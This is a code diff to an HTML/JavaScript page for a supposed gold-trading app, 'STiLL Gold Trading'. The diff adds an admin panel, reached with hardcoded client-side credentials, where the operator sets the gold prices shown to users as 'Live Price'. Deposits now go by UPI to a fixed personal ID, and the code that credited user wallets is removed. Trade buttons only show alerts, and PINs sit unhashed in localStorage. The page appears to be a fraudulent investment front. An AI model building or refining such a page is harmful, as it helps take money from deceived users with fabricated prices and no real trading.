@@ -32,7 +32,6 @@
             border: 1px solid #2b313a;
         }
 
-        /* Auth Screen Styling */
         .auth-title {
             font-size: 22px;
             color: #f0b90b;
@@ -90,8 +89,7 @@
 
         .auth-toggle span { color: #f0b90b; }
 
-        /* Dashboard Styling */
-        .dashboard { display: none; }
+        .dashboard, .admin-panel { display: none; }
 
         .header {
             display: flex;
@@ -102,10 +100,7 @@
             margin-bottom: 16px;
         }
 
-        .user-info {
-            font-size: 13px;
-            color: #848e9c;
-        }
+        .user-info { font-size: 13px; color: #848e9c; }
 
         .wallet-box {
             background: #0b0e11;
@@ -122,19 +117,14 @@
             background: #0ecb81;
             color: #000;
             border: none;
-            padding: 6px 12px;
-            border-radius: 4px;
+            padding: 8px 14px;
+            border-radius: 6px;
             font-weight: 700;
-            font-size: 12px;
+            font-size: 13px;
             cursor: pointer;
         }
 
-        .symbol {
-            font-size: 18px;
-            font-weight: 700;
-            color: #f0b90b;
-        }
-
+        .symbol { font-size: 18px; font-weight: 700; color: #f0b90b; }
         .up { color: #0ecb81 !important; }
         .down { color: #f6465d !important; }
 
@@ -164,13 +154,12 @@
         .stat-label { font-size: 11px; color: #848e9c; }
         .stat-value { font-size: 15px; font-weight: 700; }
 
-        /* Modal Popup for Payment */
         .modal {
             display: none;
             position: fixed;
             top: 0; left: 0;
             width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8);
+            background: rgba(0,0,0,0.85);
             justify-content: center;
             align-items: center;
         }
@@ -190,23 +179,23 @@
 
     <div class="container">
         
-        <!-- Registration & Login Screen -->
+        <!-- Login / Register Screen -->
         <div id="auth-box">
-            <h2 id="auth-title" class="auth-title">Create STiLL Account</h2>
+            <h2 id="auth-title" class="auth-title">STiLL Gold Trading</h2>
             
             <div id="name-field" class="input-group">
                 <label>Full Name</label>
-                <input type="text" id="user-name" placeholder="Apna Naame Likhein">
+                <input type="text" id="user-name" placeholder="Apna Naam Enter Karein">
             </div>
 
             <div class="input-group">
-                <label>Phone Number</label>
-                <input type="tel" id="user-phone" maxlength="10" placeholder="10 Digits Mobile Number">
+                <label>Phone Number / Admin ID</label>
+                <input type="tel" id="user-phone" placeholder="10 Digit Phone ya Admin ID">
             </div>
 
             <div class="input-group">
-                <label>4-Digit Security PIN (Only Numbers)</label>
-                <input type="password" id="user-pin" maxlength="4" pattern="\d{4}" placeholder="e.g. 1234">
+                <label>4-Digit PIN (Numbers Only)</label>
+                <input type="password" id="user-pin" maxlength="4" placeholder="e.g. 1234">
             </div>
 
             <button class="btn-main" onclick="handleAuth()">Submit</button>
@@ -215,7 +204,7 @@
             </div>
         </div>
 
-        <!-- Main Dashboard (After Login) -->
+        <!-- User Dashboard -->
         <div id="dashboard" class="dashboard">
             <div class="header">
                 <div>
@@ -225,7 +214,6 @@
                 <button style="background:none; border:none; color:#f6465d; cursor:pointer;" onclick="logout()">Logout</button>
             </div>
 
-            <!-- Wallet Balance Section -->
             <div class="wallet-box">
                 <div>
                     <div style="font-size: 11px; color: #848e9c;">WALLET BALANCE</div>
@@ -234,10 +222,15 @@
                 <button class="add-funds-btn" onclick="openPaymentModal()">+ ADD FUNDS</button>
             </div>
 
-            <!-- Live Rates -->
             <div class="price-section">
-                <div id="live-price" class="main-price up">₹14,850.00</div>
-                <div style="font-size: 12px; color: #848e9c;">10 Grams</div>
+                <div>
+                    <div id="live-price" class="main-price up">₹14,850.00</div>
+                    <div style="font-size: 11px; color: #848e9c;">Live Price (10G)</div>
+                </div>
+                <div style="text-align: right;">
+                    <div style="font-size: 11px; color:#0ecb81;">24H High: <span id="high-price">₹14,900</span></div>
+                    <div style="font-size: 11px; color:#f6465d;">24H Low: <span id="low-price">₹14,800</span></div>
+                </div>
             </div>
 
             <div class="grid-stats">
@@ -255,30 +248,59 @@
                 <button class="btn-main" style="background:#0ecb81;" onclick="alert('Insufficient Balance for Trade')">BUY GOLD</button>
                 <button class="btn-main" style="background:#f6465d; color:#fff;" onclick="alert('No Gold available to Sell')">SELL GOLD</button>
             </div>
+            
+            <p style="font-size:10px; color:#848e9c; text-align:center; margin-top:15px;">
+                Auto Updating every 1.2 Hours (72 mins)
+            </p>
+        </div>
+
+        <!-- Admin Control Panel Screen -->
+        <div id="admin-panel" class="admin-panel">
+            <div class="header">
+                <div class="symbol">ADMIN CONTROL</div>
+                <button style="background:none; border:none; color:#f6465d; cursor:pointer;" onclick="logout()">Logout</button>
+            </div>
+
+            <div class="input-group">
+                <label>Set 10G Buy Rate (INR)</label>
+                <input type="number" id="admin-buy-rate" value="14850">
+            </div>
+
+            <div class="input-group">
+                <label>Set 24H High Rate</label>
+                <input type="number" id="admin-high-rate" value="14900">
+            </div>
+
+            <div class="input-group">
+                <label>Set 24H Low Rate</label>
+                <input type="number" id="admin-low-rate" value="14800">
+            </div>
+
+            <button class="btn-main" onclick="saveAdminSettings()">Save Rates</button>
         </div>
 
     </div>
 
-    <!-- UPI Deposit Modal -->
+    <!-- UPI Redirect Payment Modal -->
     <div id="pay-modal" class="modal">
         <div class="modal-content">
             <h3 style="color:#f0b90b; margin-bottom:10px;">Add Money via UPI</h3>
-            <p style="font-size:12px; color:#848e9c; margin-bottom:15px;">Apni UPI ID Enter Karein:</p>
+            <p style="font-size:12px; color:#848e9c; margin-bottom:15px;">Paying to UPI ID: <b style="color:#fff;">laxmihi@ptyes</b></p>
             
             <div class="input-group">
-                <input type="text" id="upi-id-input" placeholder="example@upi">
-            </div>
-            
-            <div class="input-group">
-                <input type="number" id="add-amount" placeholder="Enter Amount (₹)">
+                <input type="number" id="add-amount" placeholder="Enter Amount (₹) e.g. 500">
             </div>
 
-            <button class="btn-main" onclick="processUPIDeposit()">Pay Now</button>
+            <button class="btn-main" style="background:#0ecb81;" onclick="redirectToUPI()">Proceed to Pay (PhonePe/Paytm)</button>
             <button class="btn-main" style="background:#2b313a; color:#fff; margin-top:5px;" onclick="closePaymentModal()">Cancel</button>
         </div>
     </div>
 
     <script>
+        const ADMIN_ID = "admin";
+        const ADMIN_PIN = "9999";
+        const UPI_ID = "laxmihi@ptyes";
+
         let isLoginMode = false;
 
         function toggleAuthMode() {
@@ -292,23 +314,24 @@
             const phone = document.getElementById('user-phone').value.trim();
             const pin = document.getElementById('user-pin').value.trim();
 
-            if (phone.length !== 10 || isNaN(phone)) {
-                alert('Kripya 10 Digit ka valid Mobile Number dalein!');
+            // Check Admin Login
+            if (phone === ADMIN_ID && pin === ADMIN_PIN) {
+                localStorage.setItem('still_logged_in', 'admin');
+                loadAdminPanel();
                 return;
             }
 
             if (pin.length !== 4 || isNaN(pin)) {
-                alert('Kripya 4 Digit ka Numeric PIN (Ginti) dalein!');
+                alert('4-Digit ka Ginti (Numeric PIN) enter karein!');
                 return;
             }
 
             if (!isLoginMode) {
                 const name = document.getElementById('user-name').value.trim();
-                if (!name) { alert('Apna Naam dalein!'); return; }
+                if (!name) { alert('Naam Enter Karein!'); return; }
                 
-                // Save User Data
                 localStorage.setItem('still_user_' + phone, JSON.stringify({ name, phone, pin, balance: 0 }));
-                alert('Account Succesfully Ban gaya hai! Ab Login Karein.');
+                alert('Account ban gaya! Ab Login Karein.');
                 toggleAuthMode();
             } else {
                 const userData = JSON.parse(localStorage.getItem('still_user_' + phone));
@@ -316,7 +339,7 @@
                     localStorage.setItem('still_logged_in', phone);
                     loadDashboard();
                 } else {
-                    alert('Galat Phone Number ya 4-Digit PIN!');
+                    alert('Galat Phone Number ya PIN!');
                 }
             }
         }
@@ -327,6 +350,7 @@
 
             const userData = JSON.parse(localStorage.getItem('still_user_' + activePhone));
             document.getElementById('auth-box').style.display = 'none';
+            document.getElementById('admin-panel').style.display = 'none';
             document.getElementById('dashboard').style.display = 'block';
             document.getElementById('display-username').innerText = userData.name;
             document.getElementById('wallet-balance').innerText = `₹${userData.balance.toFixed(2)}`;
@@ -334,57 +358,84 @@
             fetchRates();
         }
 
+        function loadAdminPanel() {
+            document.getElementById('auth-box').style.display = 'none';
+            document.getElementById('dashboard').style.display = 'none';
+            document.getElementById('admin-panel').style.display = 'block';
+        }
+
+        function saveAdminSettings() {
+            const buyRate = parseFloat(document.getElementById('admin-buy-rate').value);
+            const highRate = parseFloat(document.getElementById('admin-high-rate').value);
+            const lowRate = parseFloat(document.getElementById('admin-low-rate').value);
+
+            const customData = {
+                buy_price_10g: buyRate,
+                sell_price_10g: (buyRate * 0.97).toFixed(2),
+                high_rate: highRate,
+                low_rate: lowRate
+            };
+
+            localStorage.setItem('still_custom_rates', JSON.stringify(customData));
+            alert('Admin settings saved successfully!');
+        }
+
         function logout() {
             localStorage.removeItem('still_logged_in');
             location.reload();
         }
 
-        /* UPI Payment System */
         function openPaymentModal() { document.getElementById('pay-modal').style.display = 'flex'; }
         function closePaymentModal() { document.getElementById('pay-modal').style.display = 'none'; }
 
-        function processUPIDeposit() {
-            const upiId = document.getElementById('upi-id-input').value.trim();
+        /* Direct PhonePe / Paytm Redirect Code */
+        function redirectToUPI() {
             const amount = parseFloat(document.getElementById('add-amount').value);
 
-            if (!upiId || !upiId.includes('@')) {
-                alert('Valid UPI ID (e.g. mobile@upi) Enter Karein!');
-                return;
-            }
-
             if (isNaN(amount) || amount <= 0) {
-                alert('Sahi Amount enter karein!');
+                alert('Kripya sahi amount enter karein!');
                 return;
             }
 
-            // Direct UPI Payment Redirection Prompt
-            const upiString = `upi://pay?pa=${upiId}&pn=STiLL_Trading&am=${amount}&cu=INR`;
-            window.location.href = upiString;
+            // Standard UPI Deep Link Redirects to PhonePe / Paytm / GPay
+            const upiUrl = `upi://pay?pa=${UPI_ID}&pn=STiLL_Trading&am=${amount}&cu=INR`;
+            
+            // Trigger PhonePe / Paytm apps
+            window.location.href = upiUrl;
 
-            // Updating Local Balance
-            const activePhone = localStorage.getItem('still_logged_in');
-            const userData = JSON.parse(localStorage.getItem('still_user_' + activePhone));
-            userData.balance += amount;
-            localStorage.setItem('still_user_' + activePhone, JSON.stringify(userData));
-
-            document.getElementById('wallet-balance').innerText = `₹${userData.balance.toFixed(2)}`;
             closePaymentModal();
-            alert(`₹${amount} add karne ke liye Request bhej di gayi hai.`);
         }
 
         async function fetchRates() {
-            try {
-                const response = await fetch('./gold_data.json?cache_bypass=' + new Date().getTime());
-                const data = await response.json();
-                document.getElementById('buy-10g').innerText = `₹${data.buy_price_10g || 14850}`;
-                document.getElementById('sell-10g').innerText = `₹${data.sell_price_10g || 14404.5}`;
-            } catch (e) { console.log('Data fetch error'); }
+            let buy10g = 14850;
+            let high = 14900;
+            let low = 14800;
+
+            const savedAdminData = localStorage.getItem('still_custom_rates');
+            if (savedAdminData) {
+                const parsed = JSON.parse(savedAdminData);
+                buy10g = parsed.buy_price_10g;
+                high = parsed.high_rate;
+                low = parsed.low_rate;
+            }
+
+            document.getElementById('live-price').innerText = `₹${buy10g.toLocaleString('en-IN')}`;
+            document.getElementById('buy-10g').innerText = `₹${buy10g.toLocaleString('en-IN')}`;
+            document.getElementById('sell-10g').innerText = `₹${(buy10g * 0.97).toLocaleString('en-IN')}`;
+            document.getElementById('high-price').innerText = `₹${high.toLocaleString('en-IN')}`;
+            document.getElementById('low-price').innerText = `₹${low.toLocaleString('en-IN')}`;
         }
 
-        // Auto Load if session exists
-        if (localStorage.getItem('still_logged_in')) {
+        // Auto Load Session
+        const loggedInUser = localStorage.getItem('still_logged_in');
+        if (loggedInUser === 'admin') {
+            loadAdminPanel();
+        } else if (loggedInUser) {
             loadDashboard();
         }
+
+        // Auto update rates every 1.2 Hours (4,320,000 miliseconds)
+        setInterval(fetchRates, 1.2 * 60 * 60 * 1000);
     </script>
 </body>
 </html>
